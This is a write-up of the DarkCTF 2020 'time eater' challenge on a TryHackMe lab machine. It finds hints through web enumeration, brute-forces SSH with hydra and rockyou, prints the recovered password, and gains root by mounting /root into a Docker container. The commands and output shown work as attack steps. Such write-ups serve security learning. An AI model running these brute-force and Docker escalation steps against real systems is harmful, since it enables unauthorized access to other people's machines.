# DarkCTF 2020

## linux/time eater

> 63 solves / 446 points  
>  
> Author: Wolfy  
>  
> This room requires account on Try Hack Me tryhackme.com/jr/darkctflo  
>  
> Note: submit the root flag here.

Tags: _linux_ _web_ _bruteforce_ _docker_ _gobuster_

## Summary

Multistage exploit.

1. Find userids and password hint  
2. Bruteforce SSH  
3. Abuse Docker

Final stage was done by teammate
[gp](https://bigpick.github.io/TodayILearned/).

## Stage 1: Find ports

With most of these [tryhackmes](https://tryhackme.com/) I start with nmap
enumeration:

```  
nmap -Pn -sCV -p22,80 -oN nmap/Basic_10.10.102.97.nmap 10.10.102.97  
Nmap scan report for 10.10.102.97  
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol
2.0)  
| ssh-hostkey:  
|   2048 64:60:d1:e5:39:96:90:b9:3c:72:b0:35:c2:2a:e4:f9 (RSA)  
|   256 3c:07:fb:86:de:65:9b:52:59:70:de:06:2e:58:21:48 (ECDSA)  
|_  256 b7:ed:d9:dd:40:46:b4:dc:c8:c3:5c:a1:28:78:73:f7 (ED25519)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
|_http-title: Dimension by HTML5 UP  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
```

SSH and HTTP.

## Stage 2: Checkout website

There was an email form, but that was about it.

1. Fired off Burp Suite crawler and active scanner.  
2. Fired off sqlmap against form.  
3. Fired off gobuster (`gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://${IP} --timeout 30s 2>&1 | tee gobuster.out.1`)

Of the three gobuster produced something useful first:

```  
===============================================================  
Gobuster v3.0.1  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)  
===============================================================  
[+] Url:            http://10.10.102.97  
[+] Threads:        50  
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-
list-2.3-medium.txt  
[+] Status codes:   200,204,301,302,307,401,403  
[+] User Agent:     gobuster/3.0.1  
[+] Timeout:        30s  
===============================================================  
2020/09/26 14:05:31 Starting gobuster  
===============================================================  
/images (Status: 301)  
/info (Status: 301)  
/assets (Status: 301)  
/test (Status: 301)  
/cd (Status: 301)  
/git (Status: 301)  
/rabbit (Status: 301)  
/server-status (Status: 403)  
/uniqueroot (Status: 301)  
===============================================================  
2020/09/26 14:18:54 Finished  
===============================================================  
```

Enumerating `/uniqueroot` yielded a file
(`/uniqueroot/wolfie_backup_files/chat.txt`) with the following contents:

```  
Backup Chat Between Wolfie and Elliot:

Elliot: Hi!  
Wolfie: hello.  
Elliot: how's your work going?  
Wolfie: i am still developing site i am currently at initial state.How's your
work going?  
Elliot; Oh okay!. Yeah I am working on restricting the users in the server
using chroot but currently i am also at initial state some commands working
and some still needs to get configured.  
Wolfie: Great! how i check the progress?  
Elliot: If you want to check my progress you can use (/elliot_important_file).  
Wolfie: Thanks!:).

Signing Out...  
```

Great, we have two user names `wolfie` and `elliot`, and yet another link that
leads to `/elliot_important_file/note.txt` with the following:

```  
Wolfie i have added password from rockyou  
```

## Stage 3: Brute force SSH

```bash  
# hydra -L users -P ../rockyou.txt -M ip.txt -t 4 ssh  
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in
military or secret service organizations, or for illegal purposes (this is
non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26
14:25:30  
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip
waiting)) from a previous session found, to prevent overwriting,
./hydra.restore  
[DATA] max 4 tasks per 1 server, overall 4 tasks, 28688798 login tries
(l:2/p:14344399), ~7172200 tries per task  
[DATA] attacking ssh://10.10.102.97:22/  
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 28688754 to do in 10866:58h, 4
active  
[STATUS] 29.00 tries/min, 87 tries in 00:03h, 28688711 to do in 16487:46h, 4
active  
[STATUS] 29.14 tries/min, 204 tries in 00:07h, 28688594 to do in 16406:53h, 4
active  
[STATUS] 28.20 tries/min, 423 tries in 00:15h, 28688375 to do in 16955:19h, 4
active  
[STATUS] 27.29 tries/min, 846 tries in 00:31h, 28687952 to do in 17520:14h, 4
active  
[22][ssh] host: 10.10.102.97   login: elliot   password: godisgood  
```

```  
# ssh elliot@$IP  
The authenticity of host '10.10.102.97 (10.10.102.97)' can't be established.  
ECDSA key fingerprint is SHA256:y3FWpnBN0WIfyoNeS4c+2T6AAd0HIV8jJNX7yBaaqng.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.10.102.97' (ECDSA) to the list of known hosts.  
[email protected]'s password:  
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-117-generic x86_64)

* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/advantage

 System information as of Sun Sep 27 02:26:38 UTC 2020

 System load:  0.0                Processes:           91  
 Usage of /:   18.0% of 23.99GB   Users logged in:     0  
 Memory usage: 16%                IP address for eth0: 10.10.102.97  
 Swap usage:   0%

* Canonical Livepatch is available for installation.  
  - Reduce system reboots and improve kernel security. Activate at:  
https://ubuntu.com/livepatch

14 packages can be updated.  
0 updates are security updates.

Last login: Tue Sep 15 10:09:00 2020 from 192.168.43.240  
elliot@wolf_server:~$  
```

We're in.

First thing I typed was `history`:

```  
...  
sudo -u dark /bin/dash  
...  
```

The `sudo` stood out:

```  
$ sudo -u dark /bin/dash  
$ cd /home/dark  
$ ls -l  
total 4  
-rw-r--r-- 1 root root 36 Sep 13 11:50 user.txt  
$ cat user.txt  
flag{user_flag_for_this_challenge}  
```

Not the flag we're looking for.

## Stage 4: Get the flag

I'm going to gloss over what didn't work for me, in short, looking for suids,
trying to brute force wolfie's password, looking for other interesting files
that may have the goods, checking out cron ("time" was in the challenge
title), looking for backups, etc...  the usual stuff.

After all that I just uploaded linpeas, and ran that as elliot and dark.  User
dark flagged `docker` as interesting.

```bash  
$ docker images  
WARNING: Error loading config file: /home/elliot/.docker/config.json: stat
/home/elliot/.docker/config.json: permission denied  
REPOSITORY          TAG                 IMAGE ID            CREATED
SIZE  
alpine              latest              a24bb4013296        4 months ago
5.57MB

dark@wolf_server:/home/dark$ docker run -v /root:/loot --rm -it alpine /bin/sh  
WARNING: Error loading config file: /home/elliot/.docker/config.json: stat
/home/elliot/.docker/config.json: permission denied  
/ # cd /loot/ [TAB]  
.local/     .rootflag/  .ssh/  
/ # cd /loot/.rootflag/  
/loot/.rootflag # ls -l  
total 4  
-rw-r--r--    1 root     root            42 Sep 12 14:05 root.txt  
/loot/.rootflag # cat root.txt  
darkCTF{Escalation_using_D0cker_1ss_c00l}  
```  

Original writeup (https://github.com/datajerk/ctf-write-
ups/tree/master/darkctf2020/time_eater).